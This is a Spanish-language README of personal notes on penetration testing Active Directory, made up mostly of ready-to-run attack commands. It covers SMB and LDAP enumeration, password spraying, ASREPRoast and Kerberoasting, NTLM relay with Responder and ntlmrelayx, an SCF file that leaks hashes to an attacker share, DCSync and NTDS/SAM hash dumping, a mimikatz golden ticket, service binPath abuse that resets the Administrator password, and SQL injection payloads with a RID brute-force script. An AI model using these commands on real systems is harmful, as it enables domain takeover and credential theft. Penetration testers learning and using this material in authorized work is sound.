# Pentesting Active Directory
Este repositorio está dedicado a recopilar y organizar mis notas sobre pentesting enfocado en Directorio Activo. Aquí encontrarás información detallada, técnicas, herramientas y procedimientos utilizados durante las pruebas de penetración en entornos de Directorio Activo. 
## Enumeración de protocolos
### SMB
Listar recursos compartidos en red
```bash
smbclient -L <dc> -N
```
Listar recursos y privilegios sobre ellos
```bash
smbmap -H <dc> -u 'guess'
smbmap -H <dc>
smbmap -H <dc> -r resurso -> Si lo quieres hacer sobre un recurso en especifico
smbmap -H <dc> --download recurso -> Si quieres descargar archivos
```
Listar recursos y permisos
```bash
crackmapexec smb <ip> -u '' -p '' --shares
```
Listar las ACL sobre los recursos compartidos
```bash
smbcalcs "//<dc>/recurso_compartido" -N
````
### RPC
Listar usuarios validos en el DC
```bash
rpcclient -U "" <dc> -N
enumdomusers
```
### LDAP
Utilizar ```ldapsearch``` para enumerar nombres de domino, usuarios, etc.
```bash
ldapsearch -x -h <dc-ip> -b "DC=<nombre>,DC=<nombre>" 
```
Enumerar el dominio
```bash
ldapdomaindump -u 'dc.local\usuario' -p 'contraseña' <ip-dominio>
```
## Probar credenciales
### CrackMapExec
```bash
crackmapexec <servicio> <ip> -u 'Usuario' -p 'Contraseña'
```
Los servicios mas comunes son smb, winrm y rpc.

## Crear monturas de archivos compartidos para examinarlos con mas movilidad
```bash
mount -t cifs "//<dc>/<recurso_compartido>" /mnt/montura 
```

## Password spraying
Si se obtiene un usuario con contraseña valida puede tratar de autenticarse en equipos de un segmento de red
```bash
crackmapexec smb 192.168.1.0/24 -u 'usuario' -p 'contraseña'
```

## Atacar Kerberos

### Usuarios validos del DC con kerbrute
```bash
kerbrute userenum --dc <ip-dc> -d <dominio>.local usuarios.txt
```
### Generic write
Si tu como usuario del dominio tienes permisos de generic write sobre otros usuarios puedes modficar sus propiedades para que sean vulnerables a ASREPRoast, en powershell escribimos el siguiente comando
```powershell
Get-ADUser <usuario-a-atacar> | SetADAccountControl -doesnotrequirepreauth $true
```
Ahora podemos hacer el ataque

### ASREPRoast Attack
Solicitar TGT de ususarios validos
```bash
GetNPUsers.py <dc.local>/ -no-pass -usersfile usuarios.txt 
```
### KerberoAsting Attack
Solicitar un TGS
```bash
GetUserSPNs.py <dominio>.local/user:pass -request
```
## Groups.xml
En algunas versiones de windows dentro de SYSVOL (accesible por smb) se encuentra un archivo groups.xml que contiene contraseñas cifradas y usuarios del dominio

Para descifrar la contraseña
```bash
gpp-decrypt 'contraseña-cifrada'
```
## Conseguir Hashes NTLM v2
### Samba relay
Cuando el servidor smb no esta firmado
```bash
python3 Responder.py -I <interfaz> -rdw
```
### SCF files
Primero debemos montar un recurso compartido con impacket
```bash
impacket-smbserver <recurso>  $(pwd) -smb2support
```
Luego creamos un archivo con terminación .scf con el siguiente contenido:
```bash
[Shell]
Command=2
IconFile=\\<mi-ip>\<recurso>\icono.ico
[Taskbar]
Command=ToggleDesktop
```
## Ejecutar comandos

### Smb relay
Primero en el archivo de configuración del Responder (/usr/share/responder/Responder.conf) set off a HTTP y off a SMB
```bash
python3 Responder.py -I <interface> -rdw
```
Ahora se crea un archivo de tragets.txt donde se ponen las ip a atacar
```bash
ntlmrelayx.py -tf <target.txt> -smb2support -c "powershell ping <ip>"
```
### Con credenciales privilegiadas
```bash
psexec.py <dominio>/<usuario>[:contraseña] cmd.exe
```
## Bypass CLM
El constrained language mode es una restriccion que no nos permite utilizar todas las funcionalidades de powershell

Verificar que estamos en el clm
```powershell
$ExecutionContext.SessionState.LanguageMode
```
Si la salida es ```ConstrainedLanguage``` podemos utilizar el siguiente repo para bypassear https://github.com/padovah4ck/PSByPassCLM


## Reconocimiento y Escalacion de privilegios
### Bloodhound
BloodHound recolectara información de los ususarios y nos mostrar vias potenciales para convertirnos en domain admins
#### Sin acceso al sistema
```bash
bloodhound-python -c ALL -u 'usuario' -p 'contraeña' -ns <ip-dominio> -d <dominio>.local
```
#### Con acceso al sistema
Enviamos el siguiente script al sistema: https://raw.githubusercontent.com/puckiestyle/powershell/master/SharpHound.ps1, luego en powershell ejecutamos 
```poweshell
Invoke-BloodHound -CollectionMethod All
```
## MS14-068 Checksum validation
Es una vulnerabilidad en Kerberos que permite manipular TGT para añadir al usuario propietario del ticket a grupos administradores de dominio, para explotarla
es necesario obtener las credenciales de un usuario valido del dominio y se ejecuta el siguiente comando:
```bash
impacket-goldenPac <dc.local>/<usuario>@<dc.ip>
```
Si es exitoso se nos entrega una shell como administrador 

## Dump hashes NT
### DCSync attack
Cuando tenemos acceso a un usuario del dominio con capacidad de realizar un DCSync attack (permiso GetChanges y GetChangesAll) utilizamos secretsdump.py para dumpear los hashes de todos los usuarios del DC
```bash
python3 secretsdump.py <dominio>.local/usuario:contraseña@<ip-dc>
```
Luego con estos hashes podremos hacer pass the hash con herramientas como wmiexec

### NTDS 
Necesitaremos los archivos system y ntds.dit
```powershell
reg save HKLM\system system
```
Y la ruta comun del ntds.dit es ```C:\Windows\NTDS\ntds.dit```

Luego con impacket obtendremos los hashes NT de los usuarios del DC
```bash
impacket-secretsdump -system system -ntds ntds.dit LOCAL
```
### SAM
Necesitaremos los archivos system y sam
```powershell
reg save HKLM\system system
reg save HKLM\sam sam
```
Luego con impacket obtendremos los hashes NT de los usuarios del DC
```bash
impacket-secretsdump -system system -sam sam LOCAL
```
## Golden Ticket Attack
Primero executamos el mimikatz.exe dentro de la maquina victima (como usuario administrador de dominio) y luego aplicamos el siguiente comando
```bash
lsadump::lsa /inject /name:krbtgt
```
Guardamos el contenido de la salida en nuestra maquina

Luego utilizamos la informacion anterior para completar el siguiente comando
```bash
ticketer.py -nthas <Hash-NTLM> -domain-sid <sid-del-dominio> -domain <nombre-del-dominio> Administrator
```
Esto generarra un archivo ```.ccache``` que tendremos que exportar como varibale de entorno

```bash
export KRB5CCNAME='/ruta/al/archivo/ccache/Administrator.ccache'
```
Entonces ahora nos podemos conectar sin contraseña sobre cualquier maquina del dominio aunque esta contraseña sea cambiada o deshabilitada
```bash
psecex.py -n -k <nombre-dominio>/Administrator@<ip-del-dc> cmd.exe
```
## Herramientas

### Rubeus
Es una herramienta que nos permite abusar de kerberos y realizar ataques como kerberoasting  y asreproasting


https://github.com/GhostPack/Rubeus?tab=readme-ov-file#command-line-usage


### Evil-WinRM
Es una herramienta que nos permite conectarnos al escritorio remoto de windows, para instalarlo:
```bash
sudo gem install evil-wirm
```

## Grupos
### AccountOperators
Si detectamos que uno de los usuarios a los que tenemos acceso pertenece al grupo AccountOperators, este usuario puede crear otro usuario y añadirlo a cualquier grupo
```powershell
net user <usuario> <contraseña> /add /domain -> Crear usuario
net group "<grupo>" <usuario> /add
```
Puede ser que queramos hacer esto porque el grupo tenga permisos como WriteAcl para asignarle un permiso DCSync y conseguir los hashes NT

### ServerOperators
Te permite modificar el BinPath de un servicio para ejecutar un comando cuando un servicio se reinicia, por ejemplo cambiar la contraseña del administrador, en powershell escribimos el siguiente comando:

```powershell
sc.exe config browser binPath="C:\Windows\System32\cmd.exe /c net user Administrator pwn123!"
```
Una vez hecho esto paramos y reiniciamos el servicio con los siguientes comandos en powershell
```powershell
sc.exe stop browser
sc.exe start browser
```
El administrador ya tiene la contraseña pwn123!

## Notas

### BloodHount
Las recomendaciones y explotaciones que vienen necesitan de modulos de powershell que se encuentran en PowerExploit, generalmente se utiliza PowerView.ps1

### Enumerar dominio a traves de MS SQL Server
Si encontramos una vulnerabilidad sqli se pude intentar enumerar el dominio mediante funciones de MS SQL server
#### Nombre de dominio
```bash
' union select 1,2,default_domain(),4,5-- -
```
#### SID para obtener el RID de los usuarios
El SID es una identificador unico compuesto del identificador del dominio y el identificador de usuario, en la inyeccion se puede obtener hacer fuerza bruta sobre el RID para obtener los nombres de usuario
Primero debemos obtener el SID para un usuario valido, generalmente lo haremos para el usuario administrator porque se encuentra en todos los DC
```bash
' union select 1,2,(select sys.fn_varbintohexstr(SUSER_SID(<DOMINIO>\Administrator))),4,5-- - // 0xdeadbeef0105....
```
Aqui veremos una cadena del tipo "0xdeadbeef0105....", esta cadena quitando el "0x" tendra una longitud de 56 caracteres donde los primeros 48 equivalen al identificador de dominio y los 8 restantes al RID

En este punto tenemos el RID en hexadecimal (0xdeadbeef0105....) si hacemos la siguiente query
```bash
' union select 1,2,(select SUSER_SNAME(0xdeadbeef0105....)),4,5-- - // <Dominio>\Administrator
```
Ya que podemos observar que si le pasamos el SID nos devuelve el nombre de usuario podemos hacer fuerza bruta en los RID para obtnener los nombres de usuario del DC, para hacer esto tenemos que cambiar de decimal a hexadecimal el rango de numeros que queremos probar (generalmente del 1000 al 1200 son los RID de usuarios)

Por ejemplo para el rid 1001 usando python:
```python
sid='deadbeef......' # Priemeros 56 caracteres de la consulta select sys.fn_varbintohexstr(SUSER_SID(<DOMINIO>\Administrator)) (eliminado el 0x)
rid=hex(1001) # RID 1001
rid_list=list(rid.replace('x',''))
rid_format = rid_list[2]+rid_list[3]+rid_list[0]+rid_list[1]+'0000'
payload='0x'+sid+rid_format
print(payload) # 0xdeadbeef......e9030000
```
Ahora si hacemos la consulta con nuestro payload obtenermos el usuario krbtgt, entonces solo bastaria hacer un ciclo for en nuesto codigo para tener los payloads para hacer bruteforce sobre los usuarios
```bash
' union select 1,2,(select SUSER_SNAME(0xdeadbeef......e9030000)),4,5-- - // <Dominio>\krbtg
```
